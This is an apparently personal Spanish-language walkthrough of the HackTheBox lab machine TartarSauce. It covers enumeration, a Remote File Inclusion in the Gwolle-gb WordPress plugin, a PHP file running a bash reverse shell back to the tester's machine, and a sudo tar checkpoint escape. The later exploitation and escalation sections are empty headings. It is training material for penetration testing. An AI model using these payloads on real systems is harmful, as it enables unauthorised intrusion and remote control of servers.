
![[Pasted image 20241011180023.png]]


https://www.hackthebox.com/machines
---

| ![[Pasted image 20241007194520.png]]![[Pasted image 20241007194515.png]]**  OS** | ![[Pasted image 20241007195719.png]]**  Difficult** | **Tags** | **RELEASED**   | **Social Media**            |
| -------------------------------------------------------------------------------- | --------------------------------------------------- | -------- | -------------- | --------------------------- |
| **LINUX**                                                                        | **MEDIUM**                                          | #API     | **12/05/2018** | https://github.com/gorkaaaa |

Skills:

- RFI (Remote File Inclusion) - Abusing Wordpress Plugin [Gwolle-gb]
- RFI to RCE (Creating our malicious PHP file)

- Abusing Sudoers Privilege (Tar Command)
- Abusing Cron Job (Privilege Escalation) [Code Analysis] [Bash Scripting]
- ICMP Data Exfiltration (Python Scapy)

---

# Enumeración
*Esta fase va a consistir en hacer una enumeración general sobre la máquina para poder valorar vectores de intrusión y valorar posibles ataques.*

1. Comprobamos Conectividad.
```r
❯ ping -c 1 10.10.10.88
PING 10.10.10.88 (10.10.10.88) 56(84) bytes of data.
64 bytes from 10.10.10.88: icmp_seq=1 ttl=63 time=68.3 ms

--- 10.10.10.88 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 68.251/68.251/68.251/0.000 ms
```
*Vemos que tenemos coenctividad con la máquina victima.*

2. Enumeración De Sistema Operativo con script.
```r
❯ whichSystem.py 10.10.10.88

	10.10.10.88 (ttl -> 63): Linux
```
*Vemos que estamos ante un linux por el ttl.*

3. Enumeración de Puertos con nmap.
```r
❯ sudo nmap -p- --min-rate 5000 -sS -T5 -Pn -n 10.10.10.88 -oG allPorts
PORT   STATE SERVICE
80/tcp open  http
```
*Podemos ver que solo tenemos el puerto 80 abierto.*

```r
❯ extractPorts allPorts
───────┬──────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.88
   5   │     [*] Open ports: 80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴───────────────────────────────────────────────
```
*Utilizamos esta utilidad para poder tener los puertos copiado en la clipboard*

```r
❯ sudo nmap -p80 -sCV 10.10.10.88 -oN targeted
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
```

4. Puerto 80
```r
❯ whatweb http://10.10.10.88 -v
WhatWeb report for http://10.10.10.88
Status    : 200 OK
Title     : Landing Page
IP        : 10.10.10.88
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.18 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.18 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Fri, 11 Oct 2024 16:08:20 GMT
	Server: Apache/2.4.18 (Ubuntu)
	Last-Modified: Wed, 21 Feb 2018 20:31:20 GMT
	ETag: "2a0e-565becf5ff08d-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 2146
	Connection: close
	Content-Type: text/html
```
*Podemos ver las teconologias que emplea la página y una explicación de las mismas.*

![[Pasted image 20241011180958.png]]
*Lo primero que vemos cuando entramos es esto...*

```r
❯ curl http://10.10.10.88/robots.txt
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```
*Podemos ver algunas rutas en el robots...*

```r
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.88/webservices/FUZZ
000000793:   301        9 L      28 W       319 Ch      "wp"
```
*Vemos que nos ha encontrado algo un wordpress.*

![[Pasted image 20241011181736.png]]
*Cuando entramos al wordpress vemos esto...*

```html
<link rel="pingback" href="http://tartarsauce.htb/webservices/wp/xmlrpc.php">
```
*Si nos fijamos lo vemos todo mal, pero en el codigo fuente podemos ver que se está aplicando virtual hosting.*

```r
❯ whatweb http://10.10.10.88/webservices/wp
http://10.10.10.88/webservices/wp/ [200 OK] Apache[2.4.18], Bootstrap[3.3.6,4.9.4], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.88], JQuery[1.12.4], MetaGenerator[WordPress 4.9.4], Modernizr[custom.min], PoweredBy[&nbsp;], Script[text/javascript], Title[Test blog & 8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.9.4], X-UA-Compatible[IE=edge]
```
*Podemos ver que efectivamente estamos ante un wordpress.*

![[Pasted image 20241011182441.png]]
*Vemos que tiene xmlrpc.php que con este recurso se pueden hacer cosas.*

```r
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u http://10.10.10.88/webservices/wp/FUZZ
000000468:   200        0 L      0 W  0 Ch "wp-content/plugins/akismet/"    
000004504:   200        0 L      0 W  0 Ch "wp-content/plugins/gwolle-gb/" ```
*Vemos que nos enumera dos plugins...*

```r
❯ searchsploit gwolle
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion  | php/webapps/38861.txt
```
*Vemos que tiene una vulenrabilidad de RFI*

```r
❯ searchsploit -x php/webapps/38861.txt
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```
*Podemos ver esta ruta la cual nos permite cargar un archivo, vamos ha hacer una prueba con un servidor en python.*

```r
❯ curl 'http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.14/'

❯ sudo python3 -m http.server 80
10.10.10.88 - - [11/Oct/2024 14:31:36] "GET /wp-load.php HTTP/1.0" 404 -
```
*Podemos ver que nos intenta cargar un archivo php...*

```php
───────┬────────────────────────────────────────────────────────
       │ File: wp-load.php
───────┼────────────────────────────────────────────────────────
   1   │ <?php
   2   │ system("bash -c 'bash -i >& /dev/tcp/10.10.16.14/443 0>&1'");
   3   │ ?>
───────┴────────────────────────────────────────────────────────
```
*Nos creamos este script en php que nos da una reverse-shell.*

```r
❯ sudo nc -nlvp 443
listening on [any] 443 ...

❯ sudo python3 -m http.server 80
10.10.10.88 - - [11/Oct/2024 14:40:45] "GET /wp-load.php HTTP/1.0" 200 -
```
*Ponemos el nc y el servidor de python...*

```r
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.14/
```
*Nos dirijimos a esta web.*

```r
</wp/wp-content/plugins/gwolle-gb/frontend/captcha$
```
*Nos da la reverseshell!*

```r
</wp/wp-content/plugins/gwolle-gb/frontend/captcha$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null

❯ stty raw -echo;fg
[1]  + continued  
                  reset xterm
</wp/wp-content/plugins/gwolle-gb/frontend/captcha$
```
*Hacemos un tratamiento de la tty aun que no lo hayamos hecho completo.*

```r
www-data@TartarSauce:/var/www/html/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l
(onuma) NOPASSWD: /bin/tar
```
*Ahora podemos ver que tenemos privilegios para hacer un tar desde el usuario onuma.*

![[Pasted image 20241011204940.png]]
*Podemos ver esto...*

```r
www-data@TartarSauce:/var/www/html/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

$ whoami
onuma
```
*Vemos que ahora nos hemos convertido en onuma*

# Explotación
*En esta fase vamos a ya tener un vector de ataque previamente enumerado y vamos a explotarlo.*



# Escalada de privilegios
*Esta fase va a consistir en pasar de ser un usuario no privilegiado a ser el administrador del sistema aprovechandonos de fallos en la seguridad internos del servidor.*

